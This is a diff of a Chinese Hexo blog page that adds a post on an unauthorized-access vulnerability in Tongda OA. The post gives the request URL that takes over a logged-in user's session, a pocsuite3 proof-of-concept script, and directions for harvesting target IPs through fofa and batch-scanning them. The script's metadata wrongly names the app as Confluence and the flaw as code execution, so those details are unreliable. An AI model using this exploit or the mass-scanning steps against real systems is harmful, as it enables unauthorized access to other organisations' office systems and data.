@@ -17,16 +17,28 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>东风往林</title>
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/index.html">
+  <title>通达OA未授权访问漏洞 | 东风往林</title>
+  <meta name="description" content="漏洞类型：未授权访问漏洞利用条件：用户在线漏洞详情1、先访问 http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;mobile&#x2F;auth_mobi.php?isAvatar&#x3D;1&amp;uid&#x3D;1&amp;P_VER&#x3D;0 如果出现空白页面,则说明已经获得权限.  2、在访问http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;general&#x2F; ,成功进入系统  3、如果出现RELOGIN,则说明目前没有人在线,需要等待有人登录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="通达OA未授权访问漏洞">
+<meta property="og:url" content="http://example.com/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="漏洞类型：未授权访问漏洞利用条件：用户在线漏洞详情1、先访问 http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;mobile&#x2F;auth_mobi.php?isAvatar&#x3D;1&amp;uid&#x3D;1&amp;P_VER&#x3D;0 如果出现空白页面,则说明已经获得权限.  2、在访问http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;general&#x2F; ,成功进入系统  3、如果出现RELOGIN,则说明目前没有人在线,需要等待有人登录">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/640.png">
+<meta property="og:image" content="http://example.com/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/641.png">
+<meta property="og:image" content="http://example.com/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/642.png">
+<meta property="og:image" content="http://example.com/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/643.png">
+<meta property="og:image" content="http://example.com/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/644.png">
+<meta property="og:image" content="http://example.com/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/645.png">
+<meta property="article:published_time" content="2021-03-10T14:18:03.153Z">
+<meta property="article:modified_time" content="2021-03-10T15:03:45.550Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="中间件漏洞">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/640.png">
   <!-- Canonical links -->
-  <link rel="canonical" href="http://example.com/index.html">
+  <link rel="canonical" href="http://example.com/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -295,161 +307,122 @@
 </aside>
 
   
-  <main class="main" role="main">
   
-  <div class="content article-list">
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-通达oa未授权访问漏洞" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
-      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="article-header">
-    
+    <div class="article-header">
+      
+        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">通达OA未授权访问漏洞</a>
+    <h1 class="article-title" itemprop="name">
+      通达OA未授权访问漏洞
     </h1>
   
 
-  </div>
-  
-  <p class="article-meta">
-    <span class="article-date">
+      
+      <div class="article-meta">
+        <span class="article-date">
     <i class="icon icon-calendar-check"></i>
 	<a href="/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="article-date">
-	  <time datetime="2021-03-10T14:18:03.153Z" itemprop="datePublished">3月 10</time>
+	  <time datetime="2021-03-10T14:18:03.153Z" itemprop="datePublished">2021-03-10</time>
 	</a>
 </span>
-    
+        
   <span class="article-category">
     <i class="icon icon-folder"></i>
     <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
   </span>
 
-    
+        
   <span class="article-tag">
     <i class="icon icon-tags"></i>
 	<a class="article-tag-link-link" href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" rel="tag">中间件漏洞</a>
   </span>
 
 
-    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#comments" class="article-comment-link">评论</a></span>
-    
-  </p>
-</article>
+        
 
-    
-      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="article-header">
-    
+	<span class="article-read hidden-xs">
+    	<i class="icon icon-eye-fill" aria-hidden="true"></i>
+    	<span id="/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="leancloud_visitors"  data-flag-title="通达OA未授权访问漏洞">0</span>
+    </span>
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h3 id="漏洞类型：未授权访问"><a href="#漏洞类型：未授权访问" class="headerlink" title="漏洞类型：未授权访问"></a>漏洞类型：未授权访问</h3><h3 id="漏洞利用条件：用户在线"><a href="#漏洞利用条件：用户在线" class="headerlink" title="漏洞利用条件：用户在线"></a>漏洞利用条件：用户在线</h3><h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p>1、先访问</p>
+<p><code>http://xxx.xxx.xxx/mobile/auth_mobi.php?isAvatar=1&amp;uid=1&amp;P_VER=0</code></p>
+<p>如果出现空白页面,则说明已经获得权限.</p>
+<p><img src="/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/640.png"></p>
+<p>2、在访问<code>http://xxx.xxx.xxx/general/ </code>,成功进入系统</p>
+<p><img src="/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/641.png"></p>
+<p>3、如果出现RELOGIN,则说明目前没有人在线,需要等待有人登录的时候在尝试</p>
+<p><img src="/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/642.png"></p>
+<h3 id="pocsuite3编写poc"><a href="#pocsuite3编写poc" class="headerlink" title="pocsuite3编写poc"></a>pocsuite3编写poc</h3><p>github下载地址：<a target="_blank" rel="noopener" href="https://github.com/knownsec/Pocsuite3">https://github.com/knownsec/Pocsuite3</a><br>使用pocsuite3编写poc,代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class DemoPOC(POCBase):</span><br><span class="line">    vulID &#x3D; &#39;&#39;  # ssvid</span><br><span class="line">    version &#x3D; &#39;1.0&#39;</span><br><span class="line">    author &#x3D; [&#39;w7ay&#39;]</span><br><span class="line">    vulDate &#x3D; &#39;2021-3-8&#39;</span><br><span class="line">    createDate &#x3D; &#39;2021-3-8&#39;</span><br><span class="line">    updateDate &#x3D; &#39;2021-3-8&#39;</span><br><span class="line">    references &#x3D; [&#39;https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;IabOKaeNyAsh8V4k2cmXAw&#39;]</span><br><span class="line">    name &#x3D; &#39;通达OA未授权访问漏洞&#39;</span><br><span class="line">    appPowerLink &#x3D; &#39;&#39;</span><br><span class="line">    appName &#x3D; &#39;Confluence&#39;</span><br><span class="line">    appVersion &#x3D; &#39;&#39;</span><br><span class="line">    vulType &#x3D; VUL_TYPE.CODE_EXECUTION</span><br><span class="line">    desc &#x3D; &#39;&#39;&#39;查看是否存在通达OA未授权访问漏洞&#39;&#39;&#39;</span><br><span class="line">    samples &#x3D; []</span><br><span class="line">    install_requires &#x3D; [&#39;&#39;]</span><br><span class="line">    category &#x3D; POC_CATEGORY.EXPLOITS.WEBAPP</span><br><span class="line"></span><br><span class="line">    def _verify(self):</span><br><span class="line">        result &#x3D; &#123;&#125;</span><br><span class="line">        payload &#x3D; &quot;&#x2F;mobile&#x2F;auth_mobi.php?isAvatar&#x3D;1&amp;uid&#x3D;1&amp;P_VER&#x3D;0&quot;</span><br><span class="line">        response &#x3D; requests.get(self.url + payload)</span><br><span class="line">        if &quot;RELOGIN&quot; not in response.text and response.status_code &#x3D;&#x3D; 200:</span><br><span class="line">            result[&#39;status&#39;] &#x3D; &#39;[+] 存在通达OA未授权访问漏洞&#39;</span><br><span class="line">        return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">    def _attack(self):</span><br><span class="line">        return self._verify()</span><br><span class="line"></span><br><span class="line">    def parse_output(self, result):</span><br><span class="line">        output &#x3D; Output(self)</span><br><span class="line">        if result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        else:</span><br><span class="line">            output.fail(&#39;target is not vulnerable&#39;)</span><br><span class="line">        return output</span><br><span class="line"></span><br><span class="line">register_poc(DemoPOC)</span><br></pre></td></tr></table></figure>
+
+<p><strong>主要在于使用_verify()这个函数验证是否存在漏洞，判断如果返回的内容不存在RELOGIN，并且状态码为200，说明可能存在漏洞。</strong></p>
+<ul>
+<li>将写好的脚本保存放在pocs目录下，文件名为oa.py。</li>
+<li>利用fofa收集ip，搜索语法：body=”通达oa”</li>
+<li>将收集的ip保存放在pocsuite3目录下，文件名为通达OA.txt</li>
+</ul>
+<p><img src="/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/643.png"></p>
+<p>在pocsuite3目录下运行脚本：python3 cli.py -r pocs/oa.py -f 通达OA.txt –plugins html_report</p>
+<ul>
+<li>-r 表示指定使用的脚本文件</li>
+<li>-f 表示目标文件</li>
+<li>–plugins html_report 表示将结果保存为html文件</li>
+</ul>
+<p>结果输出保存在HTML文件中，打开文件</p>
+<p><img src="/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/644.png"></p>
+<p>验证结果如下：</p>
+<p><img src="/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/645.png"></p>
+<h4 id="参考链接：https-mp-weixin-qq-com-s-IabOKaeNyAsh8V4k2cmXAw"><a href="#参考链接：https-mp-weixin-qq-com-s-IabOKaeNyAsh8V4k2cmXAw" class="headerlink" title="参考链接：https://mp.weixin.qq.com/s/IabOKaeNyAsh8V4k2cmXAw"></a><strong>参考链接：</strong><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/IabOKaeNyAsh8V4k2cmXAw">https://mp.weixin.qq.com/s/IabOKaeNyAsh8V4k2cmXAw</a></h4>
+      
+    </div>
+    <div class="article-footer">
+      
+    </div>
+  </article>
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/19/Metasploit/">msf使用大全</a>
-    </h1>
+    
+  <section id="comments">
+  	
+  </section>
+
+
   
+</div>
 
-  </div>
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
   
-  <p class="article-meta">
-    <span class="article-date">
-    <i class="icon icon-calendar-check"></i>
-	<a href="/2021/01/19/Metasploit/" class="article-date">
-	  <time datetime="2021-01-18T16:00:00.000Z" itemprop="datePublished">1月 19</time>
-	</a>
-</span>
+  <ul class="pager pull-left">
     
-  <span class="article-category">
-    <i class="icon icon-folder"></i>
-    <a class="article-category-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a>
-  </span>
-
     
-  <span class="article-tag">
-    <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/%E5%86%85%E7%BD%91/" rel="tag">内网</a>, <a class="article-tag-link-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a>
-  </span>
-
-
-    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/01/19/Metasploit/#comments" class="article-comment-link">评论</a></span>
+    <li class="next">
+      <a href="/2021/01/19/Metasploit/" title="msf使用大全"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
     
-  </p>
-</article>
-
     
-      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="article-header">
-    
+  </ul>
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/05/tamper%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87/">tamper 安全狗的绕过</a>
-    </h1>
   
-
-  </div>
   
-  <p class="article-meta">
-    <span class="article-date">
-    <i class="icon icon-calendar-check"></i>
-	<a href="/2021/01/05/tamper%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87/" class="article-date">
-	  <time datetime="2021-01-04T16:00:00.000Z" itemprop="datePublished">1月 5</time>
-	</a>
-</span>
-    
-  <span class="article-category">
-    <i class="icon icon-folder"></i>
-    <a class="article-category-link" href="/categories/python/">python</a>
-  </span>
-
-    
-  <span class="article-tag">
-    <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/python/" rel="tag">python</a>, <a class="article-tag-link-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a>
-  </span>
-
-
-    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/01/05/tamper%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87/#comments" class="article-comment-link">评论</a></span>
-    
-  </p>
-</article>
-
-    
-      <article class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="article-header">
-    
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/03/web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">web 信息收集</a>
-    </h1>
-  
-
-  </div>
-  
-  <p class="article-meta">
-    <span class="article-date">
-    <i class="icon icon-calendar-check"></i>
-	<a href="/2021/01/03/web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="article-date">
-	  <time datetime="2021-01-02T16:00:00.000Z" itemprop="datePublished">1月 3</time>
-	</a>
-</span>
-    
-  <span class="article-category">
-    <i class="icon icon-folder"></i>
-    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
-  </span>
-
-    
-  <span class="article-tag">
-    <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a>
-  </span>
-
-
-    <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/01/03/web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#comments" class="article-comment-link">评论</a></span>
-    
-  </p>
-</article>
-
+  <div class="bar-right">
     
   </div>
+  </div>
+</nav>
+  
 
-   
+
 </main>
 
   <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
@@ -607,6 +580,8 @@ $(function() {
 </script>
 
 
+
+   
 
 
 
